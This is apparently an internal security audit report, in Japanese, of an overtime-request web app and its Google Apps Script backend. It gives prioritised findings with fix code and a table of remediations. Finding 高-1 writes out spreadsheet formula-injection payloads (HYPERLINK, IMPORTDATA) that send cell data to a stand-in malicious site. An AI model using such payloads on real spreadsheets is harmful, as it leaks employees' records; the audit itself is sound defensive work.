# セキュリティ確認の結果（overtime VPS 版・公開前）

- 日付: 2026-11-26
- 対象: `D:\projects\zangyo-kyujitsu-app\github-repo\vps-app`（api・web・docker-compose・backup）と、ブランチ `team-g-gas` の `src/Internal.gs`・`src/Cutover.gs`・`src/api.gs`（関連して読んだもの: `src/mail.gs`・`src/pdfExport.gs`）
- 前提: `https://overtime.lineworks-local.net` を Cloudflare Tunnel で公開する。Cloudflare Access は使わない。ログインは Google（`lineworks-local.info` だけ）。部署ごとの共有アカウントなので、ログインした社員は誰でも作業員・承認者の操作ができる（設計どおり）。管理者はメールの一覧。
- 方法: コードを読んだ確認、秘密の検索（作業ツリーと git の履歴）、`pip-audit`（requirements.txt。依存の依存は対象外）。動いている環境への試験はしていません。

## 全体の判定

危険度は **中〜高** です。公開の前に直すべきものは「高」の 1 件です。

ログイン（state・nonce・PKCE・id_token の検証・hd の確認）、セッションのクッキー、RPC の Origin の確認、管理者だけの関数の確認、Sheets への書き込み先の許可リストは、よくできています。弱いのは、社員が入れた文字がそのまま GAS の台帳と PDF のセルに「式」として入る点と、外から届く token（Sebastian・GAS の内部用）の守りの厚さです。

| 区分 | 件数 |
|---|---|
| 高 | 1 |
| 中 | 5 |
| 低 | 12 |

---

## 高

### 高-1 申請の文字が台帳・PDF のセルに「式」として入る（数式の差し込み）

- 分類: A03 Injection（スプレッドシートの数式）
- 場所:
  - 受け口（検証なし）: `vps-app/api/app/domain/requests.py:102-117`（`dept`・`workerLabel`・`reason`・`reasonDetail`・`workContent`・`workNo1-3` を `_field` で受けるだけ）、`requests.py:164-177`（そのまま保存）
  - Requests タブへの反映は `stringValue`（`services/sheet_codec.py:411`）なので、ここでは式になりません。
  - 式になる所（GAS）: `src/mail.gs:590-600`（`buildAccRow_` が `req.dept`・`req.workerName`・`req.reason`・`req.reasonDetail`・`req.workContent` を並べる）→ `src/mail.gs:698`・`702` の `setValues`。`src/pdfExport.gs:206`・`454`・`456`・`519`・`526` の `setValue`（PDF のひな形へ部署・氏名・業務内容・理由）
- 悪用できる人: ログインした社員なら誰でも（共有アカウントのパスワードを知る人なら社外からも）
- 起きること: 申請の「業務内容」に `=HYPERLINK("https://悪いサイト","PDF を開く")` や `=IMPORTDATA("https://悪いサイト/?d="&A2)` のような文字を入れると、GAS が蓄積台帳（`ACCUMULATION_SS_ID`）と PDF 用のシートへ書くときに式として入ります。`setValue`・`setValues` は `=` で始まる文字を式として扱うためです。
  - 台帳（労務の記録）の表示が書き換わる。ほかの人の行を参照・集計する式も入れられる。
  - `IMPORTDATA`・`IMPORTXML` で台帳の中身を外へ送れる可能性がある（Google 側の外部データの警告で止まるかは【要確認】）。
  - PDF に偽のリンクや計算結果が載る。
- 補足: GAS 版の画面でも同じ弱さがあったと思われます。VPS 版で社外から使えるようになるため、ここで直すのがよいです。
- 直し方（2 か所で止める）:

VPS の入口で、式として読まれる先頭の文字を拒み、選ぶ項目はマスタ・定数と照らします（`api_submitRequest`。氏名は `parse_worker_choice` の結果を作業員マスタの名前に置き換えます）。

```python
# BAD（requests.py:102-117）
dept = _field(data, "dept")
reason = _field(data, "reason", True)
work_content = _field(data, "workContent", True)

# GOOD
_FORMULA_LEAD = ("=", "+", "-", "@", "\t", "\r", "\n")
MAX_TEXT = 500

def _safe_text(label: str, value: str, max_len: int = MAX_TEXT) -> str:
    if len(value) > max_len:
        raise RpcError(f"{label}が長すぎます（{max_len} 字まで）。")
    if value.lstrip()[:1] in _FORMULA_LEAD:
        raise RpcError(f"{label}の先頭に = + - @ は使えません。")
    return value

dept = _safe_text("部署", _field(data, "dept"), 100)
if dept not in masters.dept_names(ctx.db):          # 作業員マスタの部署だけ
    raise RpcError("部署が正しくありません。")
reason = _field(data, "reason", True)
if reason not in constants.REASONS:
    raise RpcError("理由が正しくありません。")
reason_detail = _safe_text("補足理由", _field(data, "reasonDetail", True))
work_content = _safe_text("業務内容", _field(data, "workContent", True))
```

GAS 側でも、台帳と PDF へ書く文字の列は「書式なしテキスト」にしてから書きます（既存の行・Sebastian の経路・移行で入った値も守れます）。

```javascript
// BAD（mail.gs:698）
sh.getRange(existingRowNo, 1, 1, rowData.length).setValues([rowData]);

// GOOD: 文字の列（部署・氏名・理由・補足理由・業務内容）を先に文字の書式にする
var TEXT_COLS_ = [5, 7, 8, 9, 10]; // ACC_HEADERS_ の 部署・氏名・理由・補足理由・業務内容（1 始まり）
TEXT_COLS_.forEach(function(c) { sh.getRange(existingRowNo, c).setNumberFormat('@'); });
sh.getRange(existingRowNo, 1, 1, rowData.length).setValues([rowData]);
```

切り替えの前に、移行した DB（requests 表）と本番 DB の Requests タブに `=`・`+`・`@` で始まる値が無いことも確かめてください。

---

## 中

### 中-1 Sebastian の入口: token の強さが決まっていない・内部の例外の文が返る

- 分類: A07 / A05
- 場所: `vps-app/api/app/config.py:117`（`sebastian_api_token: str = Field(min_length=1)`）、`vps-app/api/app/domain/sebastian.py:132-137`・`162`、`vps-app/web/nginx.conf:74`（`/api/` 全体で 1 IP 1 秒 10 回・バースト 30）
- 悪用: 認証なしで社外から `POST /api/sebastian` を何度でも送れます。1 IP あたり 1 日に約 86 万回試せます。token が短い（GAS のプロパティの値を写すだけで長さを確かめていない）と当てられます。当たると、どの申請でも「残業完了（終了時刻＝今）」「休日の開始・終了（時刻を指定できる）」を本人確認なしで記録でき、実働時間と PDF・台帳が変わります。token を持つ相手には `str(exc)`（DB の例外の文など）も返ります（`sebastian.py:162`）。
- 比較は `hmac.compare_digest` で、ここは正しいです。
- 直し方:

```python
# BAD（config.py:117）
sebastian_api_token: str = Field(min_length=1)
# GOOD: 32 字以上を必須にし、GAS_INTERNAL_TOKEN と同じ値なら起動しない
sebastian_api_token: str = Field(min_length=32)
# _safety() に: if self.sebastian_api_token == self.gas_internal_token: raise ValueError(...)

# BAD（sebastian.py:162）
return {"error": str(exc) or type(exc).__name__, "action": action}
# GOOD: 詳細はログだけ
return {"error": "internal error", "action": action}
```

- あわせて: GAS の `SEBASTIAN_API_TOKEN` が 32 字以上の乱数か確かめ、短ければ Hermès 側と一緒に入れ替えます。nginx で `/api/sebastian` だけ別の厳しい回数制限（例: 1 IP 1 分 30 回）にします。Cloudflare の WAF で `/api/sebastian` を POST だけに絞るのも有効です。

### 中-2 GAS の内部用の入口: token を持つ人が「持ち主の Drive のどのファイルでも」ゴミ箱へ移せる・PDF の時間を偽れる

- 分類: A01 / A04（深い守りの不足）
- 場所: `src/Internal.gs:609-617`（`vpsTryTrash_` が `DriveApp.getFileById(fileId).setTrashed(true)`）、呼び出し元 `Internal.gs:592-596`・`651-662`（`oldPdfFileId` を本文からそのまま使う）、`Internal.gs:281-289`・`529`（`wlOverride`／`workLog` で実働時間を差し替えて PDF を作る）
- 悪用: GAS の URL は「全員」に公開です。`VPS_INTERNAL_TOKEN` が漏れる（VPS の `.env`・控えの写し・ログの誤り・ステージングとの取り違えなど）と、`internal.afterDelete` に適当な `requestId` と任意の `oldPdfFileId` を送るだけで、スクリプトの持ち主（オーナー）が編集できる Drive のファイルを次々ゴミ箱へ移せます。PDF の実働時間も自由に書けます。
- token の比較は定数時間（`vpsTimingSafeEqual_`）で、32 字未満・Sebastian と同じ値なら全部拒む作りです。ここは良いです。
- 直し方: ゴミ箱へ移す前に「PDF のフォルダの中の PDF か」を確かめます。

```javascript
// BAD（Internal.gs:609）
function vpsTryTrash_(fileId) {
  try { DriveApp.getFileById(fileId).setTrashed(true); return true; } ...

// GOOD: PDF_ROOT_FOLDER_ID の下（日付フォルダ）にある PDF だけ
function vpsTryTrash_(fileId) {
  try {
    var f = DriveApp.getFileById(fileId);
    var root = normalize_(getSettings_()['PDF_ROOT_FOLDER_ID']);
    if (f.getMimeType() !== MimeType.PDF || !vpsIsUnderFolder_(f, root, 2)) {
      return 'refused: not a PDF under PDF_ROOT_FOLDER_ID';
    }
    f.setTrashed(true);
    return true;
  } catch (e) { return String((e && e.message) || e); }
}
function vpsIsUnderFolder_(file, rootId, depth) {
  var it = file.getParents();
  while (it.hasNext()) {
    var p = it.next();
    if (p.getId() === rootId) return true;
    if (depth > 1 && vpsIsUnderFolder_(p, rootId, depth - 1)) return true;
  }
  return false;
}
```

- `workLog`（`wlOverride`）の数値も範囲（0〜24 時間）と形（`yyyy-MM-dd HH:mm:ss`）を確かめてから使ってください。

### 中-3 委任トークンがオーナー本人の「Drive 全部」の権限で、鍵と同じ所にある

- 分類: A02 / A04（最小権限）
- 場所: `vps-app/api/app/google_delegate.py:41-46`（スコープ `spreadsheets` と `drive`）、`google_delegate.py:164`、`vps-app/.env.example:36-38`（`DELEGATE_EMAIL` はオーナー本人）、`docker-compose.yml:19`（`FERNET_KEY` を api・worker の環境変数へ）
- 悪用: refresh token は Fernet で暗号化して DB に置いてあり、ここは良いです。ただし鍵（`FERNET_KEY`）も同じホストの `.env` にあります。api か worker のコンテナを乗っ取られる（今回は社外公開）、またはホストの `.env` と DB を読まれると、オーナーの Google ドライブとスプレッドシート全部を読み書き・削除できます。モジュールの説明では drive は道具だけが使うとありますが、api・worker が持つトークンにも drive が付いています。ステージングも同じオーナーのトークンを持つので、本番の資源を書かない守りはコードの許可リストだけです。
- 直し方:
  - api・worker 用のトークンは `spreadsheets` だけにします。drive が要る道具は、別の名前（例: `GoogleCredential.name='tools'`）で別に許可を取り、作業の後に取り消します。
  - できれば委任の持ち主を「このアプリのシートだけ編集できる専用アカウント」にします（GAS の持ち主と分けられるかは【要確認】）。
  - `FERNET_KEY` をコンテナの環境変数ではなく Docker secrets（ファイル）で渡し、`docker inspect` で見えないようにします。

```python
# BAD（google_delegate.py:41）
DELEGATE_SCOPES = ("openid", "email",
    "https://www.googleapis.com/auth/spreadsheets",
    "https://www.googleapis.com/auth/drive")
# GOOD: api・worker は Sheets だけ
DELEGATE_SCOPES = ("openid", "email", "https://www.googleapis.com/auth/spreadsheets")
TOOLS_SCOPES = DELEGATE_SCOPES + ("https://www.googleapis.com/auth/drive",)  # 道具用は別に許可・別に保存
```

### 中-4 90 日のセッションを止める手段が弱い（退職・異動・共有パスワードの変更に追いつかない）

- 分類: A07
- 場所: `vps-app/api/app/auth.py:121-183`（ログイン後は Google に問い合わせ直さない）、`vps-app/api/app/config.py:92-93`（最大 90 日・無操作でも 90 日）、`vps-app/api/app/domain/ops.py:106-109`（取り消しはメールごとだけ）
- 悪用: 共有アカウントでログインした端末（私物のスマホ・自宅の PC を含む）は、Google 側でパスワードを変えても、アカウントを止めても、最大 90 日使い続けられます。Cloudflare Access が無いので、社外のどこからでも使えます。部署のパスワードを知る退職者が、承認や完了の記録をできる状態が残ります。`ops_revokeSessions` は 1 つのメールの全端末を消すので、部署全員が一度に締め出されます（それ自体は正しい動きです）。
- 設計で 90 日と決めているので、短くせずに済む守りを足すのがよいです。
  - ログインの時に id_token の `sub`、IP、ブラウザを sessions 表に残し、管理画面に「メールごとの端末の数・最後に使った日時・IP」を出す。
  - 全員のセッションを一度に消す運用関数を用意する（`SESSION_SECRET` の入れ替えでも同じことができるので、その手順を RUNBOOK に書く）。
  - 退職・パスワード変更の時に `ops_revokeSessions` を必ず使う、と RUNBOOK に書く。
  - 可能なら Cloudflare の WAF で国を日本に絞る（低い手間で効きます）。

```python
# GOOD（auth.py の create_session に足す例）
UserSession(token_hash=..., email=user.email, name=user.name,
            google_sub=claims["sub"], login_ip=client_ip, user_agent=ua[:200], ...)
# ops_revokeAllSessions（管理者だけ）: db.execute(delete(UserSession))
```

### 中-5 依存ライブラリに既知の脆弱性がある

- 分類: A06
- 場所: `vps-app/api/requirements.txt`
- `pip-audit` の結果（直接の依存だけ）:

| パッケージ | 今の版 | 件数 | 直る版 | このアプリへの影響 |
|---|---|---|---|---|
| pyjwt | 2.10.1 | 17 | 2.15.0 | id_token はサーバーが Google から直接受け取るので、外から偽の JWT を入れにくい。JWKS の取り直しの扱い（PYSEC-2026-177・4140）や署名の文字の扱い（4147）があるので上げる |
| starlette | 0.50.0 | 5 | 1.3.1 | `request.url` を Host・パスから組み立てる件（PYSEC-2026-161・248）。`pages.py:105` が `request.url` から `next` を作る（`safe_next` で守ってはいる） |
| cryptography | 46.0.7 | 4 | 50.0.0 | Fernet と JWT の検証に使う |
| requests | 2.32.3 | 2 | 2.33.0 | google-auth が使う |
| anyio | 4.7.0 | 2 | 4.14.2 | 影響は小さい |

- 直し方: 上の版へ上げ、`fastapi` も starlette 1.3.1 以上に合う版へ上げて、テスト（`docker build --target test`）を通します。依存の依存（h11・httpcore など）も、イメージの中で `pip-audit` を 1 回動かして確かめてください。

---

## 低

### 低-1 例外の文がそのまま画面に返る
`vps-app/api/app/domain/dashboards.py:113`・`189` が `{"error": str(exc)}` を返し、画面（`top.js:371`・`approver.js:163`）に出ます。DB の例外ならテーブル名や SQL の一部が見えます。`rpc.py` の 500 と同じく、決まった文にして詳細はログだけにします。

```python
# BAD
return {"today": "", "overtime": [], "holiday": [], "error": str(exc)}
# GOOD
log.exception("api_getDashboard failed")
return {"today": "", "overtime": [], "holiday": [], "error": "データを取得できませんでした。"}
```

### 低-2 入力の長さの上限が無い
`requests.py:102-117` は長さを見ません（本文は nginx で 2MB まで）。Google スプレッドシートのセルは 50,000 字までなので、長い値の行は行の反映が止まり（blocked）、その申請の PDF も作られません。高-1 の `_safe_text` で上限を決めます。

### 低-3 ログインと入口の記録・回数制限が足りない
`nginx.conf:86-124`（`/auth/` と `/` は回数制限なし）、`auth.py:373-396`（ログインの成功・失敗を残さない）。社外公開なので、ログインの成功・失敗（メール・IP・理由）を audit_log かログに残し、`/auth/` にも緩い回数制限（例: 1 IP 1 秒 5 回）を付けます。

### 低-4 コンテナの守り
`docker-compose.yml:40-135`。良い点: api・worker は `USER app`（uid 10001）、DB とどのコンテナもホストにポートを出していない。足りない点:
- 全部が 1 つのネットワーク `overtime-net` にあり、cloudflared から db へ直接届く。`front`（cloudflared・web）と `back`（web・api・worker・db・backup）に分ける。
- `read_only: true`・`cap_drop: [ALL]`・`security_opt: [no-new-privileges:true]` が無い（api・worker・web）。web は `/var/cache/nginx`・`/var/run` を tmpfs にすれば read_only にできる。
- `Dockerfile:16` で本番イメージに `curl` が入っている（healthcheck 用。python の 1 行に替えられる）。
- `nginx:1.27-alpine`・`postgres:16-alpine` は版が動く。digest か細かい版で固定し、定期的に上げる。

```yaml
  api:
    read_only: true
    tmpfs: ["/tmp"]
    cap_drop: ["ALL"]
    security_opt: ["no-new-privileges:true"]
    networks: [overtime-back]
```

### 低-5 バックアップが同じホストにだけ、暗号化なしで置かれる
`backup/backup_entrypoint.sh:28-39`、`docker-compose.yml:129`。`umask 077` で本人だけ読める点は良いです。ただ、ホストが壊れる・乗っ取られると、DB と控えを同時に失う・読まれます（申請の全データ、セッションのハッシュ、暗号化された委任トークン）。`age` などで暗号化して別の場所（社内の NAS・別のクラウド）へ毎日写し、戻せることを月に 1 回試します。

### 低-6 管理者・承認者の判定が DB スプレッドシートの編集権に頼っている
`vps-app/api/app/permissions.py:33-86`。Settings の `ADMIN_EMAILS`・`GENERAL_AFFAIRS_EMAILS` と ApproverMap の `role=admin` は 5 分ごとに取り込まれます。本番 DB スプレッドシートを編集できる人は、社外公開のアプリの管理者を自分で増やせます（GAS 版と同じ）。編集できる人の一覧を確かめ、管理者が増えた・変わった時にログへ残す（config_sync で差分を記録する）ことをすすめます。

### 低-7 画面の受け口が window のどの関数でも呼ぶ
`vps-app/web/static/js/gas-shim.js:342-357` は `data-on-click` の名前で `global[name]` を呼びます。今の画面の差し込みは `escHtml`・`__vpsArgs` で守られていて、XSS は見つかりませんでした。ただ、将来どこかでエスケープを忘れると、`data-on-click="confirmDelete"` の属性を持つ HTML だけで画面の関数（承認・削除）を動かせます。呼べる名前を許可リストにします。`top.js:605` の `id="manual-area-' + rid + '"` も `escHtml(rid)` にします（今は UUID なので害はありません）。

```javascript
// GOOD
var ALLOWED_HANDLERS = { selectOrder: 1, openEditModal: 1, confirmDelete: 1 /* … 画面で使う名前だけ */ };
var fn = ALLOWED_HANDLERS[name] ? global[name] : null;
```

### 低-8 GAS の内部用の入口のリプレイ
`src/Internal.gs:28-30`・`195-211`。同じ `jobId` の二度目は記録を返しますが、記録は 300 件・7 日で消えます。token は本文に入っていて、TLS の中なので盗み見は難しいです。気になる場合は、VPS が `ts`（時刻）を付け、GAS が 10 分より古い依頼を拒むようにします。

### 低-9 GAS の旧 Sebastian 経路と転送
- `src/api.gs:35` の `body.token !== expected` は定数時間ではありません（もとからの作り。ネット越しに時間差で当てるのは現実的でないので低）。
- `src/Cutover.gs:175-208` の転送は、token を確かめずにどの本文も VPS へ送ります。VPS からは送り元が Google の IP に見えるので、nginx の回数制限が「GAS 経由の全員」で共有になります。正しい Sebastian の呼び出しが、ほかの人の試し打ちで 429 になることがあります。転送の前に GAS 側で `SEBASTIAN_API_TOKEN` を照らすとよいです。
- 転送先は `MIGRATED_TO_URL` から作り、`https://ホスト名` の形しか入らず、`followRedirects: false` なので、別のサイトへ送られる心配はありません。移転ページ（`Cutover.gs:131-169`）のパラメータのエスケープも正しいです。

### 低-10 誰でも承認済みの申請を取り消せる
`vps-app/api/app/domain/requests.py:254-276`（`api_deleteRequest` に本人・承認者の確認なし）。取り消すと PDF はゴミ箱へ、台帳の行は消えます。「ログインした社員を信じる」設計どおりで、audit_log に誰が消したかは残ります。社外公開に合わせて、承認済み・PDF ありの取り消しは管理者だけにするか、管理画面に「最近の取り消し」を出すことをすすめます。

### 低-11 リポジトリに本番の ID が書いてある
`vps-app/.env.example:42-58`・`73`、`vps-app/api/app/config.py:23-45`。秘密ではありませんが、本番 GAS の deploymentId（「全員」に公開の URL）とファイルの ID がそろっています。安全装置のために必要なので消す必要はありません。リポジトリの公開範囲が社内だけか確かめてください。git の履歴に秘密（`CHANGE_ME` 以外の token・鍵）が入っていないことは確かめました。

### 低-12 アクセスログに OAuth の code が残る
`vps-app/web/nginx.conf:19-20` は URL をそのまま記録するので、`/auth/callback?code=…&state=…` が残ります。code は一度きりで PKCE もあるので害は小さいです。`/auth/callback` だけ `access_log off` にするか、クエリを落とした形で記録します。

---

## 確かめて問題がなかったところ

- OAuth: Authorization Code ＋ PKCE（S256）、state はクッキーと `hmac.compare_digest`、nonce あり、id_token は Google の JWKS で RS256 の署名、`iss`・`aud`・`azp`・`exp`・`iat` を確認、`email_verified`、`hd` とメールのドメインの両方を確認（`auth.py:220-329`）。
- 戻り先 `safe_next` は `//`・`\`・制御文字・`/auth/` を拒む（`auth.py:195-209`）。オープンリダイレクトは見つかりませんでした。
- セッション: `__Host-` のクッキー、`Secure`・`HttpOnly`・`SameSite=Lax`、DB には SHA-256 だけ、ログインごとに新しい乱数（固定化なし）、ログアウトで DB の行を消す（`auth.py:56-163`・`399-407`）。
- RPC: Origin を `PUBLIC_ORIGIN` と完全一致、無ければ `Sec-Fetch-Site: same-origin`、`Content-Type: application/json`、閉じた関数の一覧、本文は配列だけ（`rpc.py:405-447`）。CSRF は見つかりませんでした。
- 管理者だけの関数（`api_admin*`・`api_getSecondaryApprovalList`・`api_secondaryApprove`・`ops_*` 全部）は呼ぶ前に `is_admin` を確かめる（`rpc.py:128-139`・`354-356`）。`api_secondaryApproveBatch` は中で `require_admin`（`secondary.py:116`）。承認は `can_approve_dept`（`approval.py:34`・`55`・`97`・`138`）。画面 `?page=admin`・`approve2`・`approver` も入口で確かめる（`pages.py:116-121`）。
- SQL: SQLAlchemy の式だけで、文字をつないだ SQL は見つかりませんでした。
- XSS: Jinja2 の自動エスケープ、JS へ渡す値は `<script type="application/json">` に `<`・`>`・`&` を逃がして入れる（`pages.py:69-72`）、`DATE_PARAM` は形と暦で確かめる（`pages.py:57-66`）。画面の `innerHTML` の差し込みは、見た範囲ではすべて `escHtml`・`esc`・`__vpsArgs`・`fmtMin`（数）を通っていました。CSP は `script-src 'self'`、`frame-ancestors 'self'`、HSTS・nosniff・Referrer-Policy あり（`nginx.conf:57-62`）。
- SSRF: 外へ出る先は Google の決まった URL と `GAS_INTERNAL_URL`（形を確かめ、本番・ステージングの取り違えを拒む）だけで、利用者の値で行き先は変わりません。
- 安全装置: 書けるのはこの環境の DB スプレッドシートの A・C 区分のタブだけ、書き方も `updateCells`・`values.batchUpdate`・`values.batchClear`・`appendDimension` だけ（`safety.py:76-155`、`sheets_api.py:133-166`）。起動時の確認と、GAS の ping の照合に合格していなければ GAS の仕事を動かさない作り（`gas_jobs.py:201-217`）も良いです。ひとつだけ: 本番の内部用の GAS のデプロイを作ったら、その deploymentId を `config.py:34-36` に足すことを切り替えの手順に入れてください（足し忘れても ping の scriptId の照合で止まります）。
- 秘密: `.env` は `.gitignore` に入っている。`GasClient` は token をログ・`repr` に出さない（`gas_client.py:87-88`）。git の履歴に秘密は見つかりませんでした。
- `/healthz` の詳細は管理者だけ、OpenAPI・docs は閉じている（`main.py:65`・`80-85`）。

---

## 直す順番（おすすめ）

1. 公開の前: 高-1（入口の検証と GAS の文字の書式）、中-1（Sebastian の token を 32 字以上にし、例外の文を止める）
2. 切り替えの週のうちに: 中-2（ゴミ箱へ移す前のフォルダの確認）、中-5（依存を上げてテスト）
3. 1 か月以内: 中-3（委任のスコープを分ける）、中-4（セッションの見える化と全取り消し）、低-1・低-3・低-4・低-5
4. 余裕があるとき: 残りの低

## 確かめること

- GAS の `SEBASTIAN_API_TOKEN` と `VPS_INTERNAL_TOKEN` の長さ（32 字以上の乱数か）
- Cloudflare Tunnel（overtime-vps）の公開ホスト名が `overtime.lineworks-local.net` から `http://web:80` への 1 本だけで、ほかの行き先（SSH など）が無いこと
- 本番 DB スプレッドシートと蓄積台帳を編集できる人の一覧
- 既存のデータに `=`・`+`・`@` で始まる部署・氏名・理由・業務内容が無いこと
- Google の外部データの警告が `IMPORTDATA` などを止めるか（高-1 の影響の大きさ）
## 修正の結果 (team R)

2026-11-26、ブランチ `team-r`。VPS 側（`vps-app/`）だけを直しました。GAS 側（`src/`）は GAS の担当（`team-g-gas`）が直します。試験は `1062 passed, 1 skipped`。

| 指摘 | 結果 | コミット・試験 |
|---|---|---|
| 高-1 数式の差し込み | 直した（VPS 側。利用者の文字は拒まず変えない。行の反映・照合は `stringValue`、マスタ同期は `= + - @` で始まる文字に `'` を付ける、戻しの道具は RAW。台帳・PDF のひな形への書き込みは GAS の担当） | 96902d3・`tests/test_formula_safety.py` |
| 中-1 Sebastian の token と例外の文 | 直した（`SEBASTIAN_API_TOKEN` は本番・ステージングとも 32 字以上、GAS の内部用 token と同じ値は拒む。想定外の例外は `internal error` だけ返す。nginx で `/api/sebastian` を 1 IP 1 分 30 回に） | 257b45e・5ada45a・`test_short_sebastian_token_refuses_to_start`・`test_unexpected_exception_does_not_leak_internal_text`・`test_nginx_sebastian_and_auth_limits_*` |
| 中-2 GAS の `vpsTryTrash_` | 直さない（GAS の担当） | — |
| 中-3 委任トークンの drive の許可 | 直さない（控えの道具 `tools/cutover_backup.py` が Drive の複製に drive の許可を使うため。許可を分ける作りは切り替えの後に決める） | — |
| 中-4 90 日のセッション | 一部（ログインの成功・失敗をログに残す。全員の取り消し手順を RUNBOOK に書いた。端末の一覧の画面は作っていない） | 5ada45a・9c36d54 |
| 中-5 依存の脆弱性 | 直した（fastapi 0.165.0・starlette 1.10.0・pyjwt 2.15.1・cryptography 50.0.2・requests 2.34.2・anyio 4.16.0） | d377327（全試験が通る） |
| 低-1 例外の文が画面に出る | 直した（`データを取得できませんでした。`、詳細はログ） | 257b45e・`test_approver_dashboard_hides_internal_exception_text` |
| 低-2 長さの上限 | 直した（GAS も失敗する 50,000 字だけ。仕様 8-5・8-2a） | d2c12a5・`test_text_longer_than_a_sheet_cell_is_refused_like_gas` |
| 低-3 ログインの記録と回数制限 | 直した（`/auth/` に 1 秒 5 回、成功・失敗をログに） | 5ada45a・`test_nginx_sebastian_and_auth_limits_*` |
| 低-4 コンテナの守り | 一部（api・worker に `cap_drop: ALL` と `no-new-privileges`。ネットワークの分割・read_only・版の固定は動かして確かめてから） | 5ada45a・`test_api_and_worker_drop_capabilities` |
| 低-5 バックアップの置き場 | 直さない（運用の決めごと。VPS の外の置き場が決まっていない） | — |
| 低-6 管理者の判定がシートの編集権に頼る | 直さない（GAS と同じ作り。編集者の一覧の確かめはオーナー） | — |
| 低-7 `data-on-click` の許可リスト | 直さない（画面の関数名の棚卸しが要る。今は XSS が見つかっていない） | — |
| 低-8・低-9 GAS の入口 | 直さない（GAS の担当） | — |
| 低-10 誰でも取り消せる | 直さない（設計どおり。監査ログに残る） | — |
| 低-11 リポジトリの本番の ID | 直さない（安全装置に要る。公開範囲の確かめはオーナー） | — |
| 低-12 OAuth の code がログに残る | 直した（`/auth/callback` は `access_log off`） | 5ada45a |
